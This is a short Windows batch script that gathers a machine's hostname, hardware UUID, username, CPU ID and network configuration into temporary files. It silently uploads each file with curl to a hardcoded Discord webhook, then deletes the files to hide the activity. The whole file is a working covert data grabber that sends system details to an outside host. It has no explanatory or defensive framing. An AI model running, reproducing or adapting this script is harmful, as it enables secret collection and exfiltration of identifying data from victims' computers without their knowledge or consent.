@echo off 

hostname>pcname.txt 
wmic csproduct get uuid>hwid.txt  
echo %username%>pcusername.txt 
wmic cpu get processorid>cpuid.txt 
ipconfig > ip.txt

curl --silent --output /dev/null -F l=@"hwid.txt" https://discord.com/api/webhooks/1151710086868242542/r2y3Yo3m_Pthi10Jbp0iHig5PgaG9NNBft838dxvQELdY6UjDtxtQeW4MxYVbwfbEiWk 
curl --silent --output /dev/null -F l=@"cpuid.txt" https://discord.com/api/webhooks/1151710086868242542/r2y3Yo3m_Pthi10Jbp0iHig5PgaG9NNBft838dxvQELdY6UjDtxtQeW4MxYVbwfbEiWk 
curl --silent --output /dev/null -F l=@"pcusername.txt" https://discord.com/api/webhooks/1151710086868242542/r2y3Yo3m_Pthi10Jbp0iHig5PgaG9NNBft838dxvQELdY6UjDtxtQeW4MxYVbwfbEiWk 
curl --silent --output /dev/null -F l=@"pcname.txt" https://discord.com/api/webhooks/1151710086868242542/r2y3Yo3m_Pthi10Jbp0iHig5PgaG9NNBft838dxvQELdY6UjDtxtQeW4MxYVbwfbEiWk 
curl --silent --output /dev/null -F l=@"ip.txt" https://discord.com/api/webhooks/1151710086868242542/r2y3Yo3m_Pthi10Jbp0iHig5PgaG9NNBft838dxvQELdY6UjDtxtQeW4MxYVbwfbEiWk

del pcname.txt 
del hwid.txt 
del pcusername.txt 
del cpuid.txt 
del ip.txt